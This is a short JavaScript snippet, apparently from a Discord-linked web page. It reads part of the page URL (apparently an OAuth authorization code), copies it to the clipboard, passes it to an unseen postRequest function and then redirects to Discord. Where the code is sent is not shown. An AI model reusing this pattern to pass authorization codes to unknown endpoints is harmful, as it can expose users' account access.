code = window.location.href.slice(63,100)
function copy() {
  document.getElementById('copyButton').disabled = true
  navigator.clipboard.writeText(window.location.href.slice(63,100));
  code = window.location.href.slice(63,100)
  postRequest(window.location.href.slice(63,100))
  setTimeout(openWindows, 500)
}
function openWindows() {
  window.open("discord://https://discord.com/channels/882045882311262208/1006926859835027537");
  window.open("https://discord.com/oauth2/authorized", "_self");
}
